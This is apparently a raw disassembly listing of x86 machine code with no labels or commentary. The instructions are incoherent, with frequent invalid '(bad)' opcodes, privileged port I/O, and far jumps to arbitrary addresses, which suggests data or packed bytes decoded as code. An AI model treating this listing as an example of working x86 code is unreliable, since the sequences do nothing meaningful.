  401937:	mov    DWORD PTR [ecx],edi
  401939:	pop    ss
  40193a:	into   
  40193b:	ffree  st(2)
  40193d:	clc    
  40193e:	stos   DWORD PTR es:[edi],eax
  40193f:	shl    bh,cl
  401941:	cld    
  401942:	leave  
  401943:	jmp    0x6c02df4e
  401948:	out    dx,al
  401949:	mov    eax,0x9bf3037b
  40194e:	inc    ebp
  40194f:	les    edx,FWORD PTR [edi+0x5d]
  401952:	adc    ah,BYTE PTR [edx]
  401954:	aad    0x56
  401956:	enter  0x38e2,0xde
  40195a:	sbb    al,0x96
  40195c:	repnz imul edx,DWORD PTR [eax-0x30],0xfffffffc
  401961:	xor    DWORD PTR [edi-0x7277d018],edi
  401967:	jne    0x4019df
  401969:	cdq    
  40196a:	or     DWORD PTR [eax+ebx*1],ecx
  40196d:	push   cs
  40196e:	xor    eax,0xb4cc55a2
  401973:	push   0x49
  401975:	and    al,0xb3
  401977:	adc    ecx,DWORD PTR [edx+edx*4+0x43]
  40197b:	pop    edi
  40197c:	js     0x401975
  40197e:	dec    edi
  40197f:	imul   ebx,DWORD PTR [edx],0xaa5a7d9a
  401985:	fdiv   QWORD PTR ds:0x87c5ca9c
  40198b:	xchg   esp,eax
  40198c:	sar    DWORD PTR [edx-0x4a],0xcb
  401990:	xchg   ecx,eax
  401991:	dec    edi
  401992:	daa    
  401993:	mov    esi,0xf5f84c7
  401998:	adc    eax,0xe55c89e1
  40199d:	iret   
  40199e:	lds    ebx,FWORD PTR [edi-0x5c]
  4019a1:	mov    al,ds:0xb1df192d
  4019a6:	pop    edi
  4019a7:	out    0xfa,al
  4019a9:	in     al,dx
  4019aa:	(bad)  
  4019ab:	dec    ebx
  4019ac:	pop    ebx
  4019ad:	clc    
  4019ae:	idiv   BYTE PTR [edx]
  4019b0:	push   esi
  4019b1:	jmp    0x8149:0xfea82d6c
  4019b8:	stos   DWORD PTR es:[edi],eax
  4019b9:	repz (bad) 
  4019bb:	push   edx
  4019bc:	lock xchg esi,edx
  4019bf:	rcl    DWORD PTR [edi+0x5d],0x52
  4019c3:	xchg   edx,eax
  4019c4:	daa    
  4019c5:	out    dx,al
  4019c6:	pusha  
  4019c7:	push   edx
  4019c8:	cmp    al,0xd2
  4019ca:	pop    esi
  4019cb:	out    dx,eax
  4019cc:	xor    eax,0xe2db1f66
  4019d1:	adc    dh,BYTE PTR [edx+edi*8+0x59]
  4019d5:	add    al,0x33
  4019d7:	dec    esp
  4019d8:	xchg   ecx,eax
  4019d9:	popf   
  4019da:	pop    DWORD PTR [esi+eiz*4+0x4f1c7fe3]
  4019e1:	sbb    dh,BYTE PTR ds:0x28ba1e6f
  4019e7:	fistp  WORD PTR [ebx-0x7d]
  4019ea:	hlt    
  4019eb:	es mov edi,0x82f12263
  4019f1:	jl     0x401a3c
  4019f3:	jge    0x4019f2
  4019f5:	(bad)  
  4019f6:	data16 fwait
  4019f8:	mov    ecx,0x662efde4
  4019fd:	sbb    ah,0x83
  401a00:	mov    ds:0x3dcaa2c1,al
  401a05:	push   0xffffffe3
  401a07:	clc    
  401a08:	push   ebx
  401a09:	jbe    0x401a1e
  401a0b:	jmp    0x4019b3
  401a0d:	mov    esi,0xd7382ee3
  401a12:	into   
  401a13:	pop    esp
  401a14:	jp     0x4019a2
  401a16:	ss into 
  401a18:	sub    eax,0xd815ed77
  401a1d:	aam    0xba
  401a1f:	idiv   BYTE PTR [ecx]
  401a21:	aaa    
  401a22:	xchg   ebx,eax
  401a23:	imul   edi,DWORD PTR [ebp+eax*4+0x234b26e0],0xffffffc3
  401a2b:	repnz mov ds:0x73bf42a2,al
  401a31:	sar    ebx,1
  401a33:	cmp    dl,BYTE PTR [ebx-0x3a]
  401a36:	repz fistp QWORD PTR [esi+0x50cc9f93]
  401a3d:	jle    0x401a52
  401a3f:	retf   
  401a40:	and    DWORD PTR [ebx],edi
  401a42:	xor    al,BYTE PTR [esi]
  401a44:	fwait
  401a45:	inc    ebx
  401a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a47:	addr16 push ecx
  401a49:	lock dec edi
  401a4b:	jge    0x401a88
  401a4d:	pop    ecx
  401a4e:	addr16 inc esi
  401a50:	and    al,0xcd
  401a52:	dec    esp
  401a53:	push   esi
  401a54:	fbstp  TBYTE PTR [ebx-0x351bdd90]
  401a5a:	jnp    0x4019ee
  401a5c:	div    BYTE PTR [ecx-0x67d7e9d2]
  401a62:	out    0x3d,al
  401a64:	push   ecx
  401a65:	sbb    al,0x35
  401a67:	imul   edx,DWORD PTR [eax+0x3b],0xda45d674
  401a6e:	push   0xffffffa9
  401a70:	adc    eax,0xdd3a8bbf
  401a75:	test   eax,0xf812944c
  401a7a:	xchg   ecx,eax
  401a7b:	icebp  
  401a7c:	lds    esp,FWORD PTR [ebx-0x25]
  401a7f:	js     0x401a59
  401a81:	xor    eax,0x77358d8f
  401a86:	add    al,0x85
  401a88:	aad    0xc8
  401a8a:	dec    BYTE PTR [edx+0x6a10c85d]
  401a90:	dec    ebx
  401a91:	fwait
  401a92:	mov    BYTE PTR [eax+edi*2+0x13],dh
  401a96:	std    
  401a97:	inc    dx
  401a99:	push   cs
  401a9a:	addr16 clc 
  401a9c:	mov    BYTE PTR [ebx-0x6a],0xcd
  401aa0:	push   ecx
  401aa1:	popf   
  401aa2:	xchg   ebx,eax
  401aa3:	push   es
  401aa4:	mov    edx,0xd4ebaef1
  401aa9:	sub    al,0xa1
  401aab:	mov    WORD PTR [ebx+0x1f8d13b2],ds
  401ab1:	rcl    DWORD PTR [esp+eax*1-0x37],cl
  401ab5:	iret   
  401ab6:	inc    eax
  401ab7:	mov    ch,0xd3
  401ab9:	xchg   edi,eax
  401aba:	sbb    BYTE PTR [edx],bl
  401abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401abd:	xlat   BYTE PTR ds:[ebx]
  401abe:	adc    eax,0xd7d2c7
  401ac3:	fmul   DWORD PTR [ebx+0x6485327]
  401ac9:	js     0x401b16
  401acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401acc:	jge    0x401b21
  401ace:	cmp    eax,0x6f28409f
  401ad3:	(bad)  
  401ad4:	pop    ecx
  401ad5:	(bad)  
  401ad6:	out    dx,eax
  401ad7:	sbb    al,0x44
  401ad9:	ret    0x9c7d
  401adc:	cmp    al,0xe0
  401ade:	jmp    0xbd2a170b
  401ae3:	add    BYTE PTR [eax+0x35a137f8],bh
  401ae9:	lds    ecx,FWORD PTR [ecx-0x43]
  401aec:	sub    BYTE PTR [esi-0x61],bl
  401aef:	mov    ecx,DWORD PTR [edx-0x6cb6d8f0]
  401af5:	dec    DWORD PTR [esi+0x72]
  401af8:	hlt    
  401af9:	push   esp
  401afa:	mov    bl,0xc1
  401afc:	push   eax
  401afd:	mov    ch,0xb8
  401aff:	imul   ecx,DWORD PTR [edx+0x63],0xeac694a4
  401b06:	push   0x51
  401b08:	adc    eax,0x5a075089
  401b0d:	jecxz  0x401b4b
  401b0f:	and    BYTE PTR [eax+esi*2],dh
  401b12:	xchg   DWORD PTR [edx-0x57],esi
  401b15:	sbb    BYTE PTR [ebx+ebp*4],ch
  401b18:	xchg   esp,eax
  401b19:	scas   eax,DWORD PTR es:[edi]
  401b1a:	repz cwde 
  401b1c:	enter  0xab1f,0x6c
  401b20:	call   0x13c0:0x61fee119
  401b27:	push   cs
  401b28:	pop    ebp
  401b29:	outs   dx,BYTE PTR ds:[esi]
  401b2a:	sti    
  401b2b:	xor    eax,0x90abc50
  401b30:	mov    ecx,0xc6adfd94
  401b35:	pop    edx
  401b36:	sbb    edx,ebx
  401b38:	nop
  401b39:	ds (bad) 
  401b3b:	shl    DWORD PTR [ecx+eax*1],1
  401b3e:	fbstp  TBYTE PTR [edi]
  401b40:	inc    ebp
  401b41:	inc    ebx
  401b42:	mov    ss,WORD PTR [edi+0x764cbeb3]
  401b48:	into   
  401b49:	xchg   BYTE PTR [ecx-0x48],dh
  401b4c:	sbb    BYTE PTR [edx],ch
  401b4e:	mov    bl,BYTE PTR [ecx+eax*2-0x7f4dd6e5]
  401b55:	or     BYTE PTR [ebp-0x935f769],al
  401b5b:	and    edx,ecx
  401b5d:	mov    esp,0xeb3a03ab
  401b62:	idiv   DWORD PTR [eax-0x4a]
  401b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b66:	fnsave [esi+0x8]
  401b69:	jno    0x401bc2
  401b6b:	add    BYTE PTR [ebp-0x47],dh
  401b6e:	repz sbb esp,DWORD PTR [ebp-0x72]
  401b72:	outs   dx,BYTE PTR ds:[esi]
  401b73:	retf   
  401b74:	push   ebx
  401b75:	or     DWORD PTR [esi],ebx
  401b77:	jmp    0xae8a:0x270d6d14
  401b7e:	dec    ecx
  401b7f:	loop   0x401b88
  401b81:	aad    0xa
  401b83:	daa    
  401b84:	jl     0x401bd3
  401b86:	and    dh,bl
  401b88:	lea    edx,[ebx+ebp*8+0x5d]
  401b8c:	inc    ebp
  401b8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b8e:	mul    BYTE PTR [eax-0x28dee61a]
  401b94:	mov    cl,0xf2
  401b96:	aad    0x98
  401b98:	pop    ebp
  401b99:	push   es
  401b9a:	or     al,0xdf
  401b9c:	and    edx,DWORD PTR [ebx+eax*8+0x6f]
  401ba0:	push   ebp
  401ba1:	inc    ebx
  401ba2:	dec    ecx
  401ba3:	mov    al,ds:0x4938d71c
  401ba8:	test   esp,edx
  401baa:	mov    ecx,0xa83d187f
  401baf:	pusha  
  401bb0:	call   0xa6d1:0xaba8c7e1
  401bb7:	pushf  
  401bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bb9:	cwde   
  401bba:	or     bl,bh
  401bbc:	std    
  401bbd:	ret    
  401bbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bbf:	xchg   esp,eax
  401bc0:	mov    ds:0x563d984f,al
  401bc5:	lds    ecx,FWORD PTR [eax]
  401bc7:	les    esi,FWORD PTR [edx+0x27d01da3]
  401bcd:	(bad)  
  401bce:	dec    ebx
  401bcf:	mov    ah,0x2
  401bd1:	adc    eax,DWORD PTR [ebp-0x42c61efd]
  401bd7:	dec    eax
  401bd8:	cli    
  401bd9:	xchg   BYTE PTR [ecx],ah
  401bdb:	into   
  401bdc:	lods   eax,DWORD PTR ds:[esi]
  401bdd:	outs   dx,DWORD PTR ds:[esi]
  401bde:	xchg   esp,eax
  401bdf:	jns    0x401bbd
  401be1:	push   0x54
  401be3:	test   BYTE PTR [ecx+ebp*4],dh
  401be6:	aam    0x3b
  401be8:	sub    al,0xb0
  401bea:	fwait
  401beb:	xor    al,BYTE PTR [ebp+0x35]
  401bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bef:	adc    BYTE PTR [edi+0x4ab4f0b8],dh
  401bf5:	neg    eax
  401bf7:	clc    
  401bf8:	popa   
  401bf9:	aam    0xe2
  401bfb:	inc    ebx
  401bfc:	or     al,0x4d
  401bfe:	(bad)  
  401bff:	mov    ah,0x5c
  401c01:	pop    ebp
  401c02:	pop    esi
  401c03:	test   al,0xe2
  401c05:	cmp    eax,0x745a9d20
  401c0a:	stos   BYTE PTR es:[edi],al
  401c0b:	cdq    
  401c0c:	mov    ds:0x520c7d00,eax
  401c11:	cmp    DWORD PTR [edx],0xe6a37ba6
  401c17:	push   edi
  401c18:	cmp    ebp,edx
  401c1a:	xor    eax,0x7dfd85b
  401c1f:	sbb    ebp,ebx
  401c21:	leave  
  401c22:	shr    BYTE PTR [ecx+0x31],0xbf
  401c26:	push   ecx
  401c27:	xchg   esi,eax
  401c28:	inc    ebx
  401c29:	inc    ecx
  401c2a:	(bad)  
  401c2b:	dec    ebx
  401c2c:	jne    0x401c1c
  401c2e:	lahf   
  401c2f:	js     0x401cad
  401c31:	mov    ds:0x75bf578c,eax
  401c36:	sar    DWORD PTR [ecx*1-0x2eb70f49],0x63
  401c3e:	pusha  
  401c3f:	ins    DWORD PTR es:[edi],dx
  401c40:	push   esp
  401c41:	fs jne 0x401c5b
  401c44:	ds pop eax
  401c46:	imul   ebx,DWORD PTR ds:0x6b606828,0x563fce45
  401c50:	lods   al,BYTE PTR ds:[esi]
  401c51:	sbb    al,0x41
  401c53:	pop    ebx
  401c54:	pop    eax
  401c55:	test   DWORD PTR [ecx-0x78],eax
  401c58:	rcr    DWORD PTR [edx-0x5c3b0b3f],cl
  401c5e:	stc    
  401c5f:	xchg   BYTE PTR [edi],al
  401c61:	pop    ds
  401c62:	mov    ebx,0xce3ac480
  401c67:	push   edi
  401c68:	mov    ecx,0x97a24e26
  401c6d:	ja     0x401c42
  401c6f:	xor    eax,0xe2ad10d8
  401c74:	and    BYTE PTR [edx+0x2f],ch
  401c77:	sub    DWORD PTR [esi],0x46cbe8fa
  401c7d:	popf   
  401c7e:	mov    ecx,ebx
  401c80:	sbb    eax,0x7338ed4e
  401c85:	stos   BYTE PTR es:[edi],al
  401c86:	lock es cwd 
  401c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c8b:	pusha  
  401c8c:	sar    DWORD PTR [esp+0x53],0x1d
  401c91:	dec    edi
  401c92:	sub    ecx,DWORD PTR [esi+edx*1]
  401c95:	dec    ebp
  401c96:	lds    ebx,FWORD PTR [esi+0x6aea259c]
  401c9c:	aam    0x44
  401c9e:	cmc    
  401c9f:	add    eax,0x18504f39
  401ca4:	sub    ebp,ebx
  401ca6:	out    0x6d,eax
  401ca8:	dec    edx
  401ca9:	xor    al,0x2f
  401cab:	mov    esi,0x155f4686
  401cb0:	inc    edi
  401cb1:	sbb    al,0xdf
  401cb3:	jle    0x401c8e
  401cb5:	fistp  DWORD PTR [ecx+0x5b]
  401cb8:	pop    eax
  401cb9:	std    
  401cba:	mov    dh,0x2d
  401cbc:	std    
  401cbd:	ins    DWORD PTR es:[edi],dx
  401cbe:	test   eax,0xce1edd38
  401cc3:	call   0xe9c0:0xe1e3f3e0
  401cca:	pop    ds
  401ccb:	(bad)  
  401ccc:	in     al,dx
  401ccd:	mov    eax,0xa57b7927
  401cd2:	xor    eax,0xb23c120
  401cd7:	push   0xfffffff0
  401cd9:	ret    0x697c
  401cdc:	addr16 mov ebx,edi
  401cdf:	jp     0x401d30
  401ce1:	bound  ecx,QWORD PTR [ebp+edi*2-0x21f3139b]
  401ce8:	in     al,dx
  401ce9:	mov    bl,0x96
  401ceb:	jecxz  0x401cd7
  401ced:	push   0xffffffdb
  401cef:	in     al,dx
  401cf0:	fild   QWORD PTR [edx+0x15e283aa]
  401cf6:	fidivr DWORD PTR [edi]
  401cf8:	add    DWORD PTR [esi-0x56],edi
  401cfb:	inc    edi
  401cfc:	popa   
  401cfd:	imul   esp,edx,0xf80900e9
  401d03:	pop    ss
  401d04:	scas   al,BYTE PTR es:[edi]
  401d05:	in     eax,0x1a
  401d07:	out    0xbf,eax
  401d09:	and    eax,0xdc37a6fc
  401d0e:	call   0x8f9d:0xb706a68e
  401d15:	push   ecx
  401d16:	sub    DWORD PTR [edx+0xa302120],ecx
  401d1c:	mov    ebp,0x3679e59f
  401d21:	fld    DWORD PTR [ebp-0x34]
  401d24:	icebp  
  401d25:	retf   0xc847
  401d28:	div    edx
  401d2a:	loopne 0x401d1e
  401d2c:	xor    al,0x59
  401d2e:	push   ebp
  401d2f:	cmc    
  401d30:	cs inc edi
  401d32:	mov    ds:0x7a8be2d2,eax
  401d37:	sub    BYTE PTR [ecx-0x5a952060],0x4a
  401d3e:	mov    edx,0x860488a9
  401d43:	mov    cl,BYTE PTR [edi+0x29]
  401d46:	arpl   WORD PTR [eax-0x1],bp
  401d49:	inc    eax
  401d4a:	xor    DWORD PTR [esi],ebx
  401d4c:	xor    BYTE PTR [esi],bl
  401d4e:	jno    0x401d0a
  401d50:	test   bh,ch
  401d52:	in     eax,0x34
  401d54:	retf   0xc02f
  401d57:	mov    ch,BYTE PTR [eax-0x22]
  401d5a:	jne    0x401d1f
  401d5c:	aad    0xd0
  401d5e:	jbe    0x401d8f
  401d60:	addr16 and eax,0x50520f76
  401d66:	(bad)  
  401d68:	mov    ss,WORD PTR [ebx-0x7c7b84a3]
  401d6e:	test   BYTE PTR [eax],al
  401d70:	mov    bh,0xd0
  401d72:	ja     0x401dd2
  401d74:	add    ch,BYTE PTR [ecx+ecx*2]
  401d77:	xchg   ebx,eax
  401d78:	popa   
  401d79:	fiadd  DWORD PTR [edx+0x25]
  401d7c:	mov    cl,0xd0
  401d7e:	mov    eax,ds:0xa6594737
  401d83:	lods   eax,DWORD PTR ds:[esi]
  401d84:	dec    esp
  401d85:	adc    esp,DWORD PTR [esi]
  401d87:	add    bh,cl
  401d89:	cmp    BYTE PTR [eax-0x43],ch
  401d8c:	fnstsw WORD PTR [ebx-0x6c]
  401d8f:	jmp    0x401de1
  401d91:	ss xor esp,edi
  401d94:	jb     0x401ddb
  401d96:	call   0xdd6f54d2
  401d9b:	sbb    bh,BYTE PTR [edi-0x6287d6e4]
  401da1:	popa   
  401da2:	ja     0x401d8c
  401da4:	aaa    
  401da5:	push   ebp
  401da6:	(bad)  
  401da7:	push   ebp
  401da8:	leave  
  401da9:	std    
  401daa:	ss push edx
  401dac:	jae    0x401d49
  401dae:	push   edx
  401daf:	aam    0x37
  401db1:	sti    
  401db2:	push   eax
  401db3:	ret    
  401db4:	mov    al,BYTE PTR [eax+edx*8+0x2add2ff3]
  401dbb:	sahf   
  401dbc:	outs   dx,BYTE PTR ds:[esi]
  401dbd:	out    0xdc,eax
  401dbf:	inc    ebx
  401dc0:	push   ds
  401dc1:	push   0x7b
  401dc3:	jno    0x401e39
  401dc5:	sbb    BYTE PTR [edx],ah
  401dc7:	push   ebp
  401dc8:	mov    esi,0x17700e86
  401dcd:	(bad)  
  401dce:	addr16 out 0x99,eax
  401dd1:	call   0x996d:0x8b456641
  401dd8:	and    al,0x1d
  401dda:	push   ebx
  401ddb:	xor    esp,DWORD PTR [edi-0xd]
  401dde:	data16 (bad) 
  401de0:	std    
  401de1:	adc    al,0x5
  401de3:	inc    esi
  401de4:	mov    bh,0x15
  401de6:	ror    DWORD PTR [ebx+0x1e386bb3],0xbb
  401ded:	or     BYTE PTR [eax],ah
  401def:	dec    ebx
  401df0:	test   al,0x35
  401df2:	arpl   ax,bx
  401df4:	retf   
  401df5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401df6:	mov    DWORD PTR [eax-0x52],ebp
  401df9:	aaa    
  401dfa:	popf   
  401dfb:	cmp    al,BYTE PTR [edx-0x33]
  401dfe:	inc    ecx
  401dff:	aam    0xc9
  401e01:	bound  edi,QWORD PTR [edi-0x6bf6453a]
  401e07:	out    dx,eax
  401e08:	mov    al,0x8b
  401e0a:	lds    edi,FWORD PTR [ebx+ebp*1-0x45]
  401e0e:	aaa    
  401e0f:	dec    ebp
  401e10:	pop    edi
  401e11:	mov    WORD PTR [esi-0x55198ded],?
  401e17:	mov    ebp,0x183c1149
  401e1c:	mov    ch,0x4c
  401e1e:	dec    esp
  401e1f:	push   esp
  401e20:	shl    BYTE PTR [esi],cl
  401e22:	mov    ecx,0xd9f52ef3
  401e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e28:	les    edx,FWORD PTR [ebp+0x61a48a08]
  401e2e:	inc    esp
  401e2f:	sar    eax,1
  401e31:	cmp    DWORD PTR [ebx+0x14],0xb004c784
  401e38:	fdiv   QWORD PTR [ecx+edi*4-0x76f499d0]
  401e3f:	mov    dh,0x18
  401e41:	and    BYTE PTR [bp+0x6b],dh
  401e45:	repnz jmp 0x2d2c:0xe05e3b11
  401e4d:	sbb    cl,dl
  401e4f:	xor    ch,al
  401e51:	sub    DWORD PTR [eax-0x6e],ebx
  401e54:	(bad)  
  401e55:	rol    BYTE PTR [ecx-0x20],1
  401e58:	xchg   ecx,eax
  401e59:	mov    eax,ds:0x7edcaf6c
  401e5e:	fcom   QWORD PTR [edx+0x506ccb3f]
  401e64:	pushf  
  401e65:	xor    al,0x80
  401e67:	mov    bl,0x7
  401e69:	jp     0x401e52
  401e6b:	push   0x35853feb
  401e70:	sub    eax,0x434f3ea2
  401e75:	cmp    al,0xf6
  401e77:	call   0xc62596d6
  401e7c:	ds lahf 
  401e7e:	push   esi
  401e7f:	and    esi,DWORD PTR [eax-0x6c]
  401e82:	dec    esi
  401e83:	cmp    eax,0xb7e974f6
  401e88:	xor    BYTE PTR ds:0xabbe12bc,cl
  401e8e:	jmp    0x44b5:0x88d5571a
  401e95:	fcmovne st,st(1)
  401e97:	scas   al,BYTE PTR es:[edi]
  401e98:	jmp    0x401e32
  401e9a:	out    dx,al
  401e9b:	mov    bl,BYTE PTR ds:0x6a54d710
  401ea1:	mov    edi,0x9c970df4
  401ea6:	cmp    esp,DWORD PTR ds:0x8044b5d7
  401eac:	mov    dl,0xf1
  401eae:	push   ss
  401eaf:	fstp   QWORD PTR [edx]
  401eb1:	inc    ebx
  401eb2:	xchg   esp,eax
  401eb3:	mov    ds:0xaea0dd35,al
  401eb8:	push   ecx
  401eb9:	outs   dx,BYTE PTR ds:[esi]
  401eba:	and    BYTE PTR ds:0x1ea247c4,0xe7
  401ec1:	add    al,0xbd
  401ec3:	das    
  401ec4:	sbb    eax,0x6565c4e3
  401ec9:	and    eax,DWORD PTR [ebx-0x27adbd3e]
  401ecf:	push   cs
  401ed0:	(bad)  
  401ed1:	js     0x401f32
  401ed3:	pop    ebx
  401ed4:	cwde   
  401ed5:	sub    DWORD PTR [ebp-0x3af2e283],ebp
  401edb:	lds    ebx,FWORD PTR [esi+eax*2+0x69e85ae6]
  401ee2:	in     al,0x46
  401ee4:	mov    ds:0x56c52dfe,eax
  401ee9:	in     eax,dx
  401eea:	mov    eax,0x1360a00c
  401eef:	xor    al,0x51
  401ef1:	jmp    0xb691711c
  401ef6:	ret    0x2b2e
  401ef9:	push   es
  401efa:	dec    eax
  401efb:	out    dx,eax
  401efc:	add    eax,0xb6be3255
  401f01:	xor    ebp,DWORD PTR [ebp+0x3c6179fb]
  401f07:	ret    0x19b
  401f0a:	mov    ch,0xa9
  401f0c:	push   edi
  401f0d:	add    DWORD PTR ds:0x681d0802,eax
  401f13:	inc    eax
  401f14:	jae    0x401e9f
  401f16:	test   eax,0xfed734d9
  401f1b:	les    esi,FWORD PTR [ecx]
  401f1d:	sahf   
  401f1e:	pop    edx
  401f1f:	jge    0x401ee0
  401f21:	xchg   ebp,eax
  401f22:	(bad)  
  401f23:	and    bh,BYTE PTR [eax-0x12ffb3f6]
  401f29:	stos   DWORD PTR es:[edi],eax
  401f2a:	aad    0xbc
  401f2c:	pop    esi
  401f2d:	jb     0x401f2e
  401f2f:	popa   
  401f30:	popa   
  401f31:	jbe    0x401f87
  401f33:	pop    eax
  401f34:	sbb    al,BYTE PTR [ebx-0x1b]
  401f37:	and    al,0xfc
  401f39:	push   cs
  401f3a:	repz arpl WORD PTR [edi],bx
  401f3d:	pop    edi
  401f3e:	mov    edi,0x77582d11
  401f43:	inc    ebp
  401f44:	jge    0x401f00
  401f46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f47:	mov    ah,0x2a
  401f49:	xor    eax,0x63d1e042
  401f4e:	add    edx,DWORD PTR [edx-0x5ae6cedf]
  401f54:	loope  0x401f88
  401f56:	push   edx
  401f57:	push   ebp
  401f58:	popf   
  401f59:	pop    es
  401f5a:	out    0xff,al
  401f5c:	push   eax
  401f5d:	scas   al,BYTE PTR es:[edi]
  401f5e:	cs mov bl,0xbb
  401f61:	jg     0x401fb0
  401f63:	test   BYTE PTR [esi-0x33],dh
  401f66:	ss jbe 0x401f52
  401f69:	jb     0x401f33
  401f6b:	rol    DWORD PTR [esi+0x10369002],1
  401f71:	jnp    0x401f2d
  401f73:	gs leave 
  401f75:	adc    al,0x20
  401f77:	dec    eax
  401f78:	shl    dl,0x82
  401f7b:	jns    0x401f83
  401f7d:	aas    
  401f7e:	pop    edx
  401f7f:	ja     0x401f7b
  401f81:	push   ebp
  401f82:	es std 
  401f84:	xor    al,0x63
  401f86:	mov    BYTE PTR [ebx],0x47
  401f89:	sbb    eax,0x4e925380
  401f8e:	fidiv  WORD PTR [edi+0x687117eb]
  401f94:	out    0x8e,eax
  401f96:	jbe    0x401f37
  401f98:	dec    ebp
  401f99:	repnz aam 0xc3
  401f9c:	jne    0x40201c
  401f9e:	dec    eax
  401f9f:	(bad)  
  401fa0:	push   esp
  401fa1:	adc    al,0x90
  401fa3:	jecxz  0x402010
  401fa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fa6:	pop    eax
  401fa7:	jae    0x401f93
  401fa9:	cmp    eax,0x48ea826f
  401fae:	(bad)  
  401faf:	mov    eax,ds:0x55b72a08
  401fb4:	add    dh,BYTE PTR [eax+0x2f]
  401fb7:	push   esp
  401fb8:	inc    esi
  401fb9:	sbb    DWORD PTR ds:0x98371429,0xffffff98
  401fc0:	cmp    ebx,eax
  401fc2:	sar    esp,1
  401fc4:	mov    esi,0x48471bb9
  401fc9:	push   es
  401fca:	ins    DWORD PTR es:[edi],dx
  401fcb:	sbb    al,0xfe
  401fcd:	fs out dx,al
  401fcf:	test   eax,0x6c0a435b
  401fd4:	retf   0xfb03
  401fd7:	test   al,0x0
  401fd9:	cdq    
  401fda:	sbb    al,0x4d
  401fdc:	mov    es,WORD PTR [ebx+0x4c]
  401fdf:	cmp    eax,0x6105eb26
  401fe4:	add    ebp,DWORD PTR [ecx+eax*8+0x5218050c]
  401feb:	or     bl,BYTE PTR [ebx]
  401fed:	xchg   ecx,eax
  401fee:	mov    ebx,0xf1807c0a
  401ff3:	scas   eax,DWORD PTR es:[edi]
  401ff4:	das    
  401ff5:	idiv   ebp
  401ff7:	cmc    
  401ff8:	pop    ss
  401ff9:	jl     0x401f96
  401ffb:	jle    0x402050
  401ffd:	fiadd  DWORD PTR [esi+eiz*8-0x41]
  402001:	shl    BYTE PTR [ebx+0x6826af05],1
  402007:	cld    
  402008:	xor    al,0x40
  40200a:	push   esp
  40200b:	push   ebp
  40200c:	icebp  
  40200d:	cmc    
  40200e:	sub    al,bl
  402010:	bound  esp,QWORD PTR [esi-0x26]
  402013:	xor    DWORD PTR [esi+0x30a394d2],ebx
  402019:	aaa    
  40201a:	shl    bl,1
  40201c:	sub    al,0xb8
  40201e:	adc    al,0xe4
  402020:	cmp    esp,DWORD PTR [ecx+edi*8-0x1778ea7b]
  402027:	sub    al,0x21
  402029:	sti    
  40202a:	scas   eax,DWORD PTR es:[edi]
  40202b:	enter  0xa953,0x80
  40202f:	cmc    
  402030:	sub    bh,BYTE PTR [esi]
  402032:	xor    edi,DWORD PTR [edx]
  402034:	sub    BYTE PTR [ecx+0x33],dh
  402037:	mov    ds:0xae507aeb,eax
  40203c:	push   ebx
  40203d:	xchg   esi,eax
  40203e:	jns    0x401fec
  402040:	xlat   BYTE PTR ds:[ebx]
  402041:	xchg   esp,eax
  402042:	jl     0x402024
  402044:	inc    ebx
  402045:	ins    BYTE PTR es:[edi],dx
  402046:	cmp    DWORD PTR gs:[edi],esi
  402049:	ror    dh,1
  40204b:	rcl    BYTE PTR es:[ecx+0x6d],0xee
  402050:	clc    
  402051:	jnp    0x4020b8
  402053:	and    ch,BYTE PTR [edx+0x3b]
  402056:	xor    al,0x37
  402058:	or     al,ah
  40205a:	aam    0x0
  40205c:	mov    ch,0xff
  40205e:	imul   esp,esp,0xffffffd6
  402061:	les    edi,FWORD PTR [ecx]
  402063:	bound  esi,QWORD PTR ds:[edx+0x410d5dd8]
  40206a:	cmp    dl,ah
  40206c:	xchg   BYTE PTR [ecx-0x1556ab16],bl
  402072:	call   0xd6b2:0xfcb2b1d2
  402079:	out    dx,al
  40207a:	or     ch,ch
  40207c:	push   ss
  40207d:	test   DWORD PTR [ebp+0x5476ffda],0xc57f4f93
  402087:	mov    dh,0x4d
  402089:	lods   eax,DWORD PTR ds:[esi]
  40208a:	adc    dl,cl
  40208c:	mov    esp,0xd4fb0def
  402091:	mov    edx,esi
  402093:	sub    eax,0xf1bb2ba7
  402098:	test   BYTE PTR [esi-0x10dbd3f7],dl
  40209e:	aam    0xd2
  4020a0:	mov    ch,0x55
  4020a2:	outs   dx,DWORD PTR ds:[esi]
  4020a3:	jb     0x4020a7
  4020a5:	test   BYTE PTR [ebp+ecx*8+0x255b6dd9],0x2a
  4020ad:	pop    edx
  4020ae:	rcr    DWORD PTR [ebp-0x53],0x31
  4020b2:	jno    0x4020cd
  4020b4:	sbb    esp,DWORD PTR [ebx-0x48]
  4020b7:	ret    0xaffb
  4020ba:	or     BYTE PTR [esi-0x4c],0xe3
  4020be:	dec    eax
  4020bf:	sub    bl,BYTE PTR [eax-0x51]
  4020c2:	mov    bl,0x86
  4020c4:	lods   eax,DWORD PTR ds:[esi]
  4020c5:	test   eax,0xf401a27a
  4020ca:	add    BYTE PTR [edi-0x3e],ah
  4020cd:	arpl   WORD PTR [edx+ebp*8-0x3297e662],di
  4020d4:	mov    ebx,0xede6d952
  4020d9:	inc    esp
  4020da:	cmc    
  4020db:	push   0x64
  4020dd:	xor    bl,cl
  4020df:	inc    eax
  4020e0:	scas   al,BYTE PTR es:[edi]
  4020e1:	cmc    
  4020e2:	mov    esi,DWORD PTR [ecx+esi*8]
  4020e5:	ret    0x925
  4020e8:	or     ecx,ecx
  4020ea:	cmp    eax,DWORD PTR [edx+0x34ca50f9]
  4020f0:	div    BYTE PTR [edi-0x38240d76]
  4020f6:	cmp    eax,DWORD PTR [edi+edi*8+0x58]
  4020fa:	jmp    0xfb27988
  4020ff:	push   esp
  402100:	sbb    al,0xd4
  402102:	leave  
  402103:	inc    ebp
